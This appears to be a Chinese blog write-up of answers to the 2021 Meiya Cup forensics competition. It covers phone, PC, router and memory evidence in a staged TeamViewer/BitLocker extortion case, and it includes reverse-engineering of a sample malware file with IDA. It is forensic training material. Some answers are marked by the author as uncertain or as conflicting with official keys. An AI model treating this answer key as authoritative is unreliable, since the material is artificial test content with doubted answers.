title="34该可疑软件安装包涉及哪些权限"></a>34该可疑软件安装包涉及哪些权限</h2><blockquote><p>【多选题】特普于电话中安装了一个可疑软件(版本为2020033001),根据该可疑软件的安装档,可疑软件中涉及以下安全许可？</p><p><strong>A . android.permission.READ_SMS读取信内容</strong></p><p><strong>B . android.permission.SEND_SMS发送短信</strong></p><p><strong>C . android.permission.READ_CONTACTS读取联系人</strong></p><p>D . android.permission.BLUETOOTH使用蓝牙</p><p>E . android.permission.CLEAR_APP_CACHE清除缓存</p></blockquote><img src="/images/meiya-2021-02/21.png" alt="image-21" style="zoom: 67%;" /><h2 id="35特普可能在电话中被可疑饮件窃取了的验证码是什么"><a href="#35特普可能在电话中被可疑饮件窃取了的验证码是什么" class="headerlink" title="35特普可能在电话中被可疑饮件窃取了的验证码是什么"></a>35特普可能在电话中被可疑饮件窃取了的验证码是什么</h2><p>根据34题已经知道该可疑APP具有读取短信内容的权限</p><p>而验证码一般也是通过短信来发送的,那么可以先看看短信中有哪些验证码:</p><img src="/images/meiya-2021-02/22.png" alt="image-22" style="zoom: 67%;" /><p>进一步验证可疑程序是不是窃取了这个验证码:</p><p>先将<code>userdata-www.icthna.net(该APP的包名)</code>这个目录导出,其存放的是该程序的应用数据</p><p>在一个文件中发现了此验证码:</p><img src="/images/meiya-2021-02/23.png" alt="image-23" style="zoom: 67%;" /><br><hr><br><h1 id="PART4特普Windows-x2F-内存"><a href="#PART4特普Windows-x2F-内存" class="headerlink" title="PART4特普Windows&#x2F;内存"></a>PART4特普Windows&#x2F;内存</h1><h2 id="36特普计算机中了病毒-该病毒的加壳方式"><a href="#36特普计算机中了病毒-该病毒的加壳方式" class="headerlink" title="36特普计算机中了病毒,该病毒的加壳方式"></a>36特普计算机中了病毒,该病毒的加壳方式</h2><p>首先需要找到该病毒文件</p><p>取证大师加载镜像后,从镜像的<code>user/download</code>目录下找到了一个疑似恶意程序的<code>malware.exe</code></p><img src="/images/meiya-2021-02/24.png" alt="image-24" style="zoom: 67%;" /><p>将其导出,并使用**detect it easy(die)**工具查壳:</p><img src="/images/meiya-2021-02/25.png" alt="image-25" style="zoom: 67%;" /><p>可以看到加壳方法是<code>UPX</code>,那么为了继续分析该恶意程序,首先需要脱壳</p><p>使用<code>UPX</code>加壳和脱壳工具对该文件进行解压(脱壳)</p><img src="/images/meiya-2021-02/26.png" alt="image-26" style="zoom: 67%;" /><p>得到脱壳后的文件:</p><img src="/images/meiya-2021-02/27.png" alt="image-27" style="zoom: 67%;" /><br><h2 id="37病毒的编译工具是什么"><a href="#37病毒的编译工具是什么" class="headerlink" title="37病毒的编译工具是什么"></a>37病毒的编译工具是什么</h2><blockquote><p>【单选题】特普的计算机可能中了病毒，病毒的编译工具是甚么？（2分）</p><p>A GCC</p><p>B Borland</p><p>C TCC</p><p><strong>D Microsoft Visual C&#x2F;C++</strong></p></blockquote><p>继续使用<code>die</code>工具来检测脱壳后的病毒文件,就可以看到其使用的编译工具了</p><img src="/images/meiya-2021-02/28.png" alt="image-28" style="zoom: 67%;" /><br><h2 id="38病毒的编译者可能使用的账户名称"><a href="#38病毒的编译者可能使用的账户名称" class="headerlink" title="38病毒的编译者可能使用的账户名称"></a>38病毒的编译者可能使用的账户名称</h2><p>使用<code>IDA</code>来分析脱壳后的病毒:</p><img src="/images/meiya-2021-02/29.png" alt="image-29" style="zoom: 67%;" /><p>在<code>string</code>视图中可以看到一个路径字符串,这里<code>user</code>后的<code>gpgf</code>应该就是一个账户名</p><br><h2 id="39病毒的自我复制位置"><a href="#39病毒的自我复制位置" class="headerlink" title="39病毒的自我复制位置"></a>39病毒的自我复制位置</h2><blockquote><p>特普的计算机可能中了病毒，病毒的自我复制位置是甚么？（2分）</p><p>A C:\Temp\temp.txt</p><p><strong>B C:\Users&lt;profile&gt;\Desktop\malware.exe</strong></p><p>C C:\Users\public\malware.exe</p><p>D C:\a.txt</p></blockquote><p>在函数中发现了用于复制文件的<code>CopyFileA</code>和<code>GetModuleFileNameA</code>函数</p><img src="/images/meiya-2021-02/30.png" alt="image-30" style="zoom: 67%;" /><p>顺着这两个函数来到它们被调用的地方:</p><img src="/images/meiya-2021-02/31.png" alt="image-31" style="zoom: 67%;" /><p>可以看到在<code>call copyFIleA</code>之前,通过<code>push</code>将若干数据入栈</p><p>这些入栈的数据中包括 <code>copyFIleA</code>需要使用到的参数</p><p>在参数中通过将从<code>004011D2</code>到<code>004011AE</code>拼接起来可以得到<code>C:\\Users\\public\\malware.exe</code>(<strong>例如55h表示单个字母U</strong>)</p><p>(官方答案给了D,没看明白…)</p><br><h2 id="40病毒修改登录文件的位置"><a href="#40病毒修改登录文件的位置" class="headerlink" title="40病毒修改登录文件的位置"></a>40病毒修改登录文件的位置</h2><blockquote><p>【单选题】特普的计算机可能中了病毒，病毒的修改登录文件位置是甚么？（3分）</p><p>A HKLM\SoftwarelMicrosoftwindows\CurrentVersion\Run</p><p>B HKCU\Software\Microsoftwwindows\CurrentVersion\ RunOnce</p><p>C HKLM\SOFTWARE\Microsoft\windowsNT\CurrentVersion\Profile List</p><p><strong>D HKLM\SOFTWARE\MicrosoftwWindowsCurrentVersion\Authentication\LogonUNBackground</strong></p></blockquote><p><strong>修改登录位置需要更改注册表</strong></p><p>找到和注册表相关的函数:</p><img src="/images/meiya-2021-02/32.png" alt="image-32" style="zoom: 67%;" /><p>双击,跟进这个函数</p><img src="/images/meiya-2021-02/33.png" alt="image-33" style="zoom: 67%;" /><p>上图中, <code>CODE XREF</code>表示<strong>代码交叉引用</strong>的意思; <code>DATA XREF</code>表示<strong>数据交叉引用</strong></p><p><code>CODE XREF</code>前面表示被引用者,后面表示引用者</p><p>那么上图中可以看出: <code>text:004013DF</code>这个位置的代码引用了 <code>RegSetValueExW</code>这个函数</p><p>按照常识,在引用函数之前,需要通过<code>push</code>来传参</p><p>那么接着跳转到<code>text:004013DF</code>,在其附近果然发现了像路径一样的参数:</p><img src="/images/meiya-2021-02/34.png" alt="image-34" style="zoom: 67%;" /><p>双击这个参数,来到其存储位置,发现了答案选项中的路径</p><img src="/images/meiya-2021-02/35.png" alt="image-35" style="zoom: 67%;" /><br><h2 id="41病毒留下了ASCII-ART艺术图"><a href="#41病毒留下了ASCII-ART艺术图" class="headerlink" title="41病毒留下了ASCII_ART艺术图"></a>41病毒留下了ASCII_ART艺术图</h2><blockquote><p>【多选题】特普的计算机可能中了病毒，病毒留下了 ASCII ART（ASCII艺术，文字图），以下哪个不是病毒留下？（3分）</p><p><strong>A HI</strong></p><p>B HELLO</p><p><strong>C HOW ARE YOU</strong></p><p><strong>D GOODBYE</strong></p></blockquote><p>上一题最后就找到了HELLO:</p><img src="/images/meiya-2021-02/35.png" alt="image-35" style="zoom: 67%;" /><br><h2 id="42病毒扰乱文件的目标文件名"><a href="#42病毒扰乱文件的目标文件名" class="headerlink" title="42病毒扰乱文件的目标文件名"></a>42病毒扰乱文件的目标文件名</h2><blockquote><p>【单选题】特普的计算机可能中了病毒，病毒扰乱文件目标文件名是甚么？（2分）</p><p><strong>A C:\Users&lt;profile&gt;\Documents\target.txt</strong></p><p>B C:\Users&lt;profile&gt;\Desktopt\target txt</p><p>C C:\c.txt</p><p>D C:\temp.txt</p></blockquote><p>字符串中还有个<code>target.txt</code></p><img src="/images/meiya-2021-02/36.png" alt="image-36" style="zoom: 67%;" /><img src="/images/meiya-2021-02/37.png" alt="image-37" style="zoom: 67%;" /><br><h2 id="43病毒的扰乱方法"><a href="#43病毒的扰乱方法" class="headerlink" title="43病毒的扰乱方法"></a>43病毒的扰乱方法</h2><blockquote><p>【单选题】特普的计算机可能中了病毒，病毒扰乱文件方法是甚么？（3分）</p><p><strong>A.+3</strong></p><p>B.XOR 5</p><p>C.+4</p><p>D.-4</p></blockquote><p>不太懂,网上说<code>fgetc</code>可以定位文件读取位置,并进行+3操作</p><img src="/images/meiya-2021-02/38.png" alt="image-38" style="zoom: 67%;" /><img src="/images/meiya-2021-02/39.png" alt="image-39" style="zoom: 67%;" /><br><h2 id="44特普计算机中-哪个是FTK-Imager-exe的程序编号-PID"><a href="#44特普计算机中-哪个是FTK-Imager-exe的程序编号-PID" class="headerlink" title="44特普计算机中,哪个是FTK_Imager.exe的程序编号(PID)"></a>44特普计算机中,哪个是FTK_Imager.exe的程序编号(PID)</h2><p>可以直接使用取证大师小程序的内存取证来搞:</p><img src="/images/meiya-2021-02/40.png" alt="image-40" style="zoom: 67%;" /><br><h2 id="45特普计算机中cmd-exe的执行日期和时间"><a href="#45特普计算机中cmd-exe的执行日期和时间" class="headerlink" title="45特普计算机中cmd.exe的执行日期和时间"></a>45特普计算机中cmd.exe的执行日期和时间</h2><blockquote><p>【多选题】特普的计算机中，cmd.exe（PID：4496）它的执行日期及时间是？（1分）</p><p>A.2021-10.17</p><p>B.2021-10-18</p><p><strong>C.2021-10.19</strong></p><p>D.10.42:51</p><p><strong>E.10:43:09</strong></p><p>F.10:43:25</p></blockquote><img src="/images/meiya-2021-02/41.png" alt="image-41" style="zoom: 67%;" /><p>(注意时区换算)</p><br><h2 id="46特普计算机通过FTP连接了哪个IP"><a href="#46特普计算机通过FTP连接了哪个IP" class="headerlink" title="46特普计算机通过FTP连接了哪个IP"></a>46特普计算机通过FTP连接了哪个IP</h2><p>使用自定义取证中的<code>路由器日志解析</code></p><p>在IP地址中只能发现一个外部IP <code>124.217.179.74</code>,那么应该就是这个</p><img src="/images/meiya-2021-02/42.png" alt="image-42" style="zoom: 67%;" /><br><h2 id="47特普计算机中-哪一个指令于上题的FTP连接中使用过"><a href="#47特普计算机中-哪一个指令于上题的FTP连接中使用过" class="headerlink" title="47特普计算机中,哪一个指令于上题的FTP连接中使用过"></a>47特普计算机中,哪一个指令于上题的FTP连接中使用过</h2><blockquote><p>【多选题】特普的计算机中，以下哪一个指令于上述连接中有使用过？（3分）</p><p>A get</p><p><strong>B put</strong></p><p>C delete</p><p><strong>D bye</strong></p><p>E Quit</p></blockquote><p>常识题了,FTP命令:</p><ul><li><code>ftp 目标IP</code>:连接FTP服务器</li><li><code>get 目标路径</code>:下载目标路径的文件</li><li><code>put 本地路径 目标路径</code>:将本地路径的文件上传到目标路径</li><li><code>mput</code>:批量上传文件</li><li><code>bye</code>:断开连接</li></ul><p>结合实际情况,这个计算机应该是被别人通过FTP上传了病毒文件,因此肯定使用过的命令包括 put 和 bye</p><br><h2 id="48在Linux的volatility中-哪一个指令可以知道此程式支持哪个Windows版本"><a href="#48在Linux的volatility中-哪一个指令可以知道此程式支持哪个Windows版本" class="headerlink" title="48在Linux的volatility中,哪一个指令可以知道此程式支持哪个Windows版本"></a>48在Linux的volatility中,哪一个指令可以知道此程式支持哪个Windows版本</h2><blockquote><p>【多选题】在Liux的” volatility”中，哪一个指令可以知道此程式支持哪个 Windows版本？（2分）</p><p><strong>A vol.py –profile</strong></p><p>B vol.py –systeminfo</p><p>C vol.py –info</p><p>D vol.py–verinfo</p></blockquote><p>常识题,答案是A</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
          <category> 比赛 </category>
          
          <category> 2021美亚杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021美亚杯_个人赛</title>
      <link href="/post/51090d68.html"/>
      <url>/post/51090d68.html</url>
      
        <content type="html"><![CDATA[<h1 id="PART1工地主管IPhone"><a href="#PART1工地主管IPhone" class="headerlink" title="PART1工地主管IPhone"></a>PART1工地主管IPhone</h1><p>此次比赛提供了Cellebrite Reader用来读取手机镜像文件,直接用其加载IPhone的ufdr备份镜像文件</p><p>打开之后可以先去<code>工具-设置</code>中把语言改成中文</p><h2 id="1工地主管的微信账号"><a href="#1工地主管的微信账号" class="headerlink" title="1工地主管的微信账号"></a>1工地主管的微信账号</h2><blockquote><p>[单选题] 工地主管电话的微信账号是什么? (1分)</p><p>A. Kasier751111</p><p>B. Kasierlee751111</p><p>C. Kasierlee</p><p>D. 以上皆非</p></blockquote><p>当头一棒,这个镜像里找不到关于微信的数据,官方也没有给出答案..</p><p>社交软件中只能看到Whatsapp</p><img src="/images/meiya-2021-01/image-20220806161820372.png" alt="image-20220806161820372" style="zoom:67%;" /><br><h2 id="2工地主管的隔空投送编号"><a href="#2工地主管的隔空投送编号" class="headerlink" title="2工地主管的隔空投送编号"></a>2工地主管的隔空投送编号</h2><p>隔空投送也就是Airdrop,这个在加载镜像后的软件首页就能够看见</p><img src="/images/meiya-2021-01/image-20220806161948387.png" alt="image-20220806161948387" style="zoom:67%;" /><br><h2 id="3工地主管电话的哪个应用程序有关于经纬度24-490474-118-110220的纪录"><a href="#3工地主管电话的哪个应用程序有关于经纬度24-490474-118-110220的纪录" class="headerlink" title="3工地主管电话的哪个应用程序有关于经纬度24.490474,118.110220的纪录"></a>3工地主管电话的哪个应用程序有关于经纬度24.490474,118.110220的纪录</h2><blockquote><p>[单选题] 工地主管电话的哪一个应用程序有关于于经纬度24.490474, 118.110220的纪录? (2分)</p><p>A. 照片</p><p>B. WhatsApp</p><p>C. Apple Maps</p><p>D. 以上皆非</p></blockquote><p>在<code>设备位置-位置-Apple Maps</code>中找到:</p><img src="/images/meiya-2021-01/image-20220806162215907.png" alt="image-20220806162215907" style="zoom:67%;" /><br><h2 id="4工地主管的电话中哪些数据正确"><a href="#4工地主管的电话中哪些数据正确" class="headerlink" title="4工地主管的电话中哪些数据正确"></a>4工地主管的电话中哪些数据正确</h2><blockquote><p>[多选题] 工地主管的手提电话中下列哪些数据正确? (1分)</p><p>A. iOS 版本为 12.5.4</p><p>B. IMEI 为 454120637213361</p><p>C. Apple ID 为 <a href="mailto:&#107;&#x61;&#105;&#x73;&#101;&#114;&#108;&#x65;&#x65;&#51;&#54;&#x36;&#48;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#107;&#x61;&#105;&#x73;&#101;&#114;&#108;&#x65;&#x65;&#51;&#54;&#x36;&#48;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a></p><p>D. 手机曾经安装dropbox 应用程序</p></blockquote><p>根据设备信息,可以确定B错误,D项没有找到,所以也没选</p><img src="/images/meiya-2021-01/image-20220806162418209.png" alt="image-20220806162418209" style="zoom:67%;" /><br><h2 id="5工地主管电话最常使用的浏览器"><a href="#5工地主管电话最常使用的浏览器" class="headerlink" title="5工地主管电话最常使用的浏览器"></a>5工地主管电话最常使用的浏览器</h2><p>找到Web浏览的历史记录,发现记录都来自SAFARI浏览器:</p><img src="/images/meiya-2021-01/image-20220806162546601.png" alt="image-20220806162546601" style="zoom:67%;" /><br><h2 id="6工地主管电话连过哪个Wifi"><a href="#6工地主管电话连过哪个Wifi" class="headerlink" title="6工地主管电话连过哪个Wifi"></a>6工地主管电话连过哪个Wifi</h2><blockquote><p>[单选题] 工地主管的电话连接过哪一个WiFi? (1分)</p><p>A. Kaiser Lee</p><p>B. Kaiser</p><p>C. Free Wifi</p><p>D. Kaiser Home</p></blockquote><p>在<code>无线网络连接</code>里查看:</p><img src="/images/meiya-2021-01/image-20220806162715419.png" alt="image-20220806162715419" style="zoom:67%;" /><br><h2 id="7工地主管和AlexChan对话中提过哪些TeamViewer号码"><a href="#7工地主管和AlexChan对话中提过哪些TeamViewer号码" class="headerlink" title="7工地主管和AlexChan对话中提过哪些TeamViewer号码"></a>7工地主管和AlexChan对话中提过哪些TeamViewer号码</h2><blockquote><p>[多选题] 工地主管与Alex Chan的Whatsapp 对话中，曾提及以下哪个TeamViewer的用户号码? (3分)</p><p>A. 435334881</p><p>B. 453851521</p><p>C. 435475200</p><p>D. 456874155</p><p>E. 435270306</p></blockquote><p>在<code>聊天</code>中搜索「Alex」就可以定位工地主管和Alex Chan的聊天记录</p><p><span id="meiya_person_03" style='color:black;background:yellow;font-size:16px;font-family:hei'><strong>根据聊天记录可以初步梳理案情:</strong></span></p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>首先alex自称是修电脑的,并让主管在电脑上安装<strong>远程控制软件teamviewer</strong>,然后又让主管给其同事的电脑上也装上,主管不仅丝毫没有怀疑,甚至还去饮了个茶?</span></p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>装好后主管把自己和同事电脑teamviewer的ID给了alex,这样alex就可以远程登录这三台电脑了</span></p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>第二天主管发现电脑磁盘被BitLocker加密了,然后被alex勒索btc</span></p><p>从聊天记录的图片中就可以找到TeamViewer号码,共三个,也就是主管和其他两个员工电脑的TeamViewerID</p><br><h2 id="8工地主管的WhatsApp中有多少个黑名单的记录"><a href="#8工地主管的WhatsApp中有多少个黑名单的记录" class="headerlink" title="8工地主管的WhatsApp中有多少个黑名单的记录"></a>8工地主管的WhatsApp中有多少个黑名单的记录</h2><p>这题需要有意识地去数据库文件里寻找</p><p>首先通过任意WhatsApp聊天记录的<code>源文件</code>可以定位此APP数据库的位置</p><img src="/images/meiya-2021-01/image-20220806163926762.png" alt="image-20220806163926762" style="zoom:67%;" /><p>按照这个路径找到<code>sqlite</code>格式的数据库文件并导出</p><img src="/images/meiya-2021-01/image-20220806164012007.png" alt="image-20220806164012007" style="zoom:67%;" /><p>通过读取工具<code>DB Browser</code>查看此数据库文件,通过表名可以定位一个黑名单表,是一个空表.所以黑名单记录数量为0</p><img src="/images/meiya-2021-01/image-20220806164116241.png" alt="image-20220806164116241" style="zoom:67%;" /><br><h2 id="9哪个蓝牙装置的Uuid-曾连接过工地主管的手机"><a href="#9哪个蓝牙装置的Uuid-曾连接过工地主管的手机" class="headerlink" title="9哪个蓝牙装置的Uuid 曾连接过工地主管的手机"></a>9哪个蓝牙装置的Uuid 曾连接过工地主管的手机</h2><blockquote><p>[多选题] 以下哪个蓝牙装置的Uuid 曾连接过工地主管的手机? (2分)</p><p>A. 7F1FE70D-2B15-C245-853D-4196F13CC446</p><p>B. 1B057C1D-83D3-99A6-D2B1-EC54846C7CEE</p><p>C. 134ACD1-83D3-99A6-D2B1-EC54846C7CEE</p><p>D. 7D1BE70D-2C16-D246-851D-491613DD776</p></blockquote><p>这题仍然需要到数据库文件中去寻找,首先从<code>设备与网络-设备连接</code>中找到蓝牙连接的记录,由此定位源文件</p><img src="/images/meiya-2021-01/image-20220806164349346.png" alt="image-20220806164349346" style="zoom:67%;" /><p>顺着这个路径找到数据库文件并查看,可以找到两条记录:</p><img src="/images/meiya-2021-01/image-20220806164433306.png" alt="image-20220806164433306" style="zoom:67%;" /><br><hr><br><h1 id="PART2工地主管Windows"><a href="#PART2工地主管Windows" class="headerlink" title="PART2工地主管Windows"></a>PART2工地主管Windows</h1><p>使用取证大师加载计算机镜像,打开后可以看到此电脑的E盘被<code>BitLocker</code>加密了</p><p>这里先不要费劲去寻找解密密钥啥的,因为Alex肯定不会傻傻地把恢复文件也存放在工地主管的电脑上,想要解密这个分区估计得后面到Alex的设备中去找….</p><h2 id="10-工地主管计算机的E盘的Bitlocker修复密钥标识符"><a href="#10-工地主管计算机的E盘的Bitlocker修复密钥标识符" class="headerlink" title="10 工地主管计算机的E盘的Bitlocker修复密钥标识符"></a>10 工地主管计算机的E盘的Bitlocker修复密钥标识符</h2><p>右键-BitLocker解密 就能看到这个恢复密钥标记</p><img src="/images/meiya-2021-01/image-20220806164828158.png" alt="image-20220806164828158" style="zoom:67%;" /><br><h2 id="11-工地主管计算机內FileZilla的用户名名称"><a href="#11-工地主管计算机內FileZilla的用户名名称" class="headerlink" title="11 工地主管计算机內FileZilla的用户名名称"></a>11 工地主管计算机內FileZilla的用户名名称</h2><p><span id="meiya_person_02">自动确证结果中就能找到:</span></p><img src="/images/meiya-2021-01/image-20220806165027692.png" alt="image-20220806165027692" style="zoom:67%;" /><br><h2 id="12工地主管的Team-Viewer-ID"><a href="#12工地主管的Team-Viewer-ID" class="headerlink" title="12工地主管的Team Viewer ID"></a>12工地主管的Team Viewer ID</h2><p>这题从[工地主管的手机中的「工地主管和alex的WhatsApp聊天记录图片」](# 7 工地主管和AlexChan对话中提过哪些TeamViewer号码)中就可以找到</p><img src="/images/meiya-2021-01/image-20220806165332531.png" alt="image-20220806165332531" style="zoom:67%;" /><br><h2 id="13-工地主管TeamViewer与哪一个ID连接"><a href="#13-工地主管TeamViewer与哪一个ID连接" class="headerlink" title="13 工地主管TeamViewer与哪一个ID连接"></a>13 工地主管TeamViewer与哪一个ID连接</h2><p>自动取证结果中找到: 这个是Alex设备的TeamViewer ID</p><img src="/images/meiya-2021-01/image-20220806165442694.png" alt="image-20220806165442694" style="zoom:67%;" /><br><h2 id="14工地主管曾用计算机浏览器搜索的关键词"><a href="#14工地主管曾用计算机浏览器搜索的关键词" class="headerlink" title="14工地主管曾用计算机浏览器搜索的关键词"></a>14工地主管曾用计算机浏览器搜索的关键词</h2><blockquote><p>[多选题] 工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻? (3分)</p><p>A. tiktok</p><p>B. web whatsapp</p><p>C. facebook</p><p>D. lihkg</p><p>E. hkgolden</p><p>F. web wechat</p></blockquote><p>仍然是自动取证,一一对应一下即可:</p><img src="/images/meiya-2021-01/image-20220806165649981.png" alt="image-20220806165649981" style="zoom:67%;" /><br><h2 id="15工地主管计算机的Windows系统的产品标识符"><a href="#15工地主管计算机的Windows系统的产品标识符" class="headerlink" title="15工地主管计算机的Windows系统的产品标识符"></a>15工地主管计算机的Windows系统的产品标识符</h2><p>产品标识符也就是产品ID．在取证结果-<code>系统信息</code>找到:</p><img src="/images/meiya-2021-01/image-20220806170132362.png" alt="image-20220806170132362" style="zoom:67%;" /><br><h2 id="16-工地主管曾用计算机WhatsApp与哪个号码沟通"><a href="#16-工地主管曾用计算机WhatsApp与哪个号码沟通" class="headerlink" title="16 工地主管曾用计算机WhatsApp与哪个号码沟通"></a>16 工地主管曾用计算机WhatsApp与哪个号码沟通</h2><p>没找到….</p><br><h2 id="17工地主管计算机的用户名称和用户标识符"><a href="#17工地主管计算机的用户名称和用户标识符" class="headerlink" title="17工地主管计算机的用户名称和用户标识符"></a>17工地主管计算机的用户名称和用户标识符</h2><blockquote><p>[多选题] 工地主管计算机的用户名称是甚么? 其用户标识符是甚么? (2分)</p><p>A. 用户名称: PC1</p><p>B. 用户名称: PC2</p><p>C. 用户名称: PC3</p><p>D. 用户标识符: 0x000003E7</p><p>E. 用户标识符: 0x000003E8</p><p>F. 用户标识符: 0x000003E9</p></blockquote><p>首先从<code>用户信息</code>中定位用户名</p><img src="/images/meiya-2021-01/image-20220806170349200.png" alt="image-20220806170349200" style="zoom:67%;" /><p><strong>选项中的用户标识符明显是16进制数字,所以需要把此用户的用户标识符数字转为16进制查看</strong></p><p>PC1的用户标识SID中,最后一段的1001转为16进制为3E9,也就是F选项</p><br><h2 id="18工地主管计算机的预设浏览器"><a href="#18工地主管计算机的预设浏览器" class="headerlink" title="18工地主管计算机的预设浏览器"></a>18工地主管计算机的预设浏览器</h2><p>这题使用仿真软件仿真进去之后,建一个html文件,看看默认使用什么浏览器打开这个文件就好了</p><h2 id="19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3-xlsx的SHA1哈希值"><a href="#19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3-xlsx的SHA1哈希值" class="headerlink" title="19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3.xlsx的SHA1哈希值"></a>19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3.xlsx的SHA1哈希值</h2><p>工地主管计算机的E盘被加密,做此题需要首先寻找分区的<strong>解密密钥</strong></p><p>解密密钥在<a href="#meiya_person_01">ALEX的FTP服务器</a>中</p><p>解开分区之后很容易找到题目中的文件,计算哈希值就行了</p><img src="/images/meiya-2021-01/image-20220807095226068.png" alt="image-20220807095226068" style="zoom:67%;" /><br><hr><br><h1 id="PART3工地路由器"><a href="#PART3工地路由器" class="headerlink" title="PART3工地路由器"></a>PART3工地路由器</h1><h2 id="20路由器记录中的哪些IP是公司的电子器材"><a href="#20路由器记录中的哪些IP是公司的电子器材" class="headerlink" title="20路由器记录中的哪些IP是公司的电子器材"></a>20路由器记录中的哪些IP是公司的电子器材</h2><blockquote><p>[多选题] 路由器的记录中显示以下有哪些IP是公司的电子器材? (3分)</p><p>A. 192.168.40.128</p><p>B. 192.168.40.129</p><p>C. 192.168.40.130</p><p>D. 192.168.40.131</p><p>E. 192.168.40.132</p></blockquote><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>在对工地主管的Windows进行分析时,可以从<code>取证结果</code>-<code>网络连接</code>中找到路由器和工地主管计算机的内网IP:</span></p><img src="/images/meiya-2021-01/image-20220807100022169.png" alt="image-20220807100022169" style="zoom:67%;" /><p>此路由器的内网网段为<code>192.168.40</code>,工地主管Windows的内网IP是<code>192.168.40.129</code></p><p>接下来在路由器日志里搜索选项中的IP地址就行了: 只有E是搜不到的</p><img src="/images/meiya-2021-01/image-20220807100211575.png" alt="image-20220807100211575" style="zoom:67%;" /><br><h2 id="21路由器记录中显示公司计算机下载了FTP软件-该下载网站的IP"><a href="#21路由器记录中显示公司计算机下载了FTP软件-该下载网站的IP" class="headerlink" title="21路由器记录中显示公司计算机下载了FTP软件,该下载网站的IP"></a>21路由器记录中显示公司计算机下载了FTP软件,该下载网站的IP</h2><p>在<a href="#meiya_person_02">分析工地主管PC</a>时已经知道其使用的FTP软件时FileZilla</p><p>在路由器记录中直接搜索关键词「FTP」无果,但是搜索「FileZilla」可以定位这里:</p><img src="/images/meiya-2021-01/image-20220807173643623.png" alt="image-20220807173643623" style="zoom:67%;" /><p>其对应的IP为49.12.121.47</p><br><h2 id="22路由器的记录中显示公司计算机的资料用FTP软件传到了什么IP地址端口"><a href="#22路由器的记录中显示公司计算机的资料用FTP软件传到了什么IP地址端口" class="headerlink" title="22路由器的记录中显示公司计算机的资料用FTP软件传到了什么IP地址端口"></a>22路由器的记录中显示公司计算机的资料用FTP软件传到了什么IP地址端口</h2><p><span id="meiya_person_04">在工地主管PC的自动取证结果中可以找到FileZilla连接的IP:</span></p><img src="/images/meiya-2021-01/image-20220807173847517.png" alt="image-20220807173847517" style="zoom:67%;" /><p>这里给出的连接端口是23,并不在选项中,因此可以在路由器记录中继续搜索这个IP,可以看到使用了21端口,也就是FTP的默认端口</p><img src="/images/meiya-2021-01/image-20220807173934021.png" alt="image-20220807173934021" style="zoom:67%;" /><br><h2 id="23路由器记录中以下哪些关键词是表示公司计算机与外界网络联机"><a href="#23路由器记录中以下哪些关键词是表示公司计算机与外界网络联机" class="headerlink" title="23路由器记录中以下哪些关键词是表示公司计算机与外界网络联机"></a>23路由器记录中以下哪些关键词是表示公司计算机与外界网络联机</h2><blockquote><p>[多选题] 路由器的记录中显示以下哪些关键词是表示公司计算机与外界网络联机? (2分)</p><p>A. destination</p><p>B. ICMP echo request</p><p>C. inside</p><p>D. outside</p><p>E. 以上皆是</p></blockquote><p>这个凭借常识或者上一题的结果就能够看出来了,AD</p><p>此外<code>inside</code>表示内网中的地址,<code>ICMP echo request</code>表示ICMP回送请求报文(也就是<code>ping</code>某个IP时产生的)</p><br><h2 id="24路由器记录中显示哪一个IP曾以teamviewer连接公司计算机"><a href="#24路由器记录中显示哪一个IP曾以teamviewer连接公司计算机" class="headerlink" title="24路由器记录中显示哪一个IP曾以teamviewer连接公司计算机"></a>24路由器记录中显示哪一个IP曾以teamviewer连接公司计算机</h2><blockquote><p>[单选题] 路由器的记录中显示哪一个IP曾以teamviewer 连接公司计算机? (1分)</p><p>A. 110.152.0.14</p><p>B. 52.152.117.114</p><p>C. 180.152.0.13</p><p>D. 83.26.80.131</p></blockquote><p>首先可以在工地主管PC的取证结果中找到被TeamViewer连接的时间</p><img src="/images/meiya-2021-01/image-20220807174552169.png" alt="image-20220807174552169" style="zoom:67%;" /><p>然后在路由器记录中定位这个时间(<strong>要注意换算UTC时间和东八区时间</strong>)</p><img src="/images/meiya-2021-01/image-20220807174757964.png" alt="image-20220807174757964" style="zoom:67%;" /><p>补充一个知识点:</p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>teamviewer默认使用的端口为<strong>5938</strong>,开始运行时首先使用<strong>53(DNS)<strong>端口来解析域名,然后使用</strong>5938</strong>端口来连接远程主机</span></p><br><h2 id="25对方通过teamviewer-遥控公司计算机的时间"><a href="#25对方通过teamviewer-遥控公司计算机的时间" class="headerlink" title="25对方通过teamviewer 遥控公司计算机的时间"></a>25对方通过teamviewer 遥控公司计算机的时间</h2><blockquote><p>[多选题] 路由器的记录中显示以下哪一个有可能是以teamviewer 遥控公司计算机的时间? (3分)</p><p>A. 09:31, 09:37</p><p>B. 0933, 09:39</p><p>C. 10:29, 10:36</p><p>D. 10:40</p><p>E. 10:42</p></blockquote><p>由上一题可以知道对方是通过<code>52.152.117.114</code>来进行远程连接的</p><p>那么可以在路由器记录中继续搜索这个IP地址</p><img src="/images/meiya-2021-01/image-20220807175432690.png" alt="image-20220807175432690" style="zoom:67%;" /><p>能够搜索到的在选项里的时间为ACE</p><br><h2 id="26路由器记录中显示有多少电子器材有可能曾被入侵"><a href="#26路由器记录中显示有多少电子器材有可能曾被入侵" class="headerlink" title="26路由器记录中显示有多少电子器材有可能曾被入侵"></a>26路由器记录中显示有多少电子器材有可能曾被入侵</h2><p><a href="#meiya_person_03">结合案件背景</a>:</p><p><span style='color:black;background:yellow;font-size:16px;font-family:hei'>Alex除了通过Teamviewer连接了工地主管的PC之外,还连接了另外两个员工的PC,所以本题首先猜测答案为3</span></p><p>接下来去路由器记录中搜索验证,还是像上一题一样去搜索攻击者的IP<code>52.152.117.114</code>:</p><p>可以定位内网IP<code>192.168.40.129</code>也就是工地主管的PC：</p><img 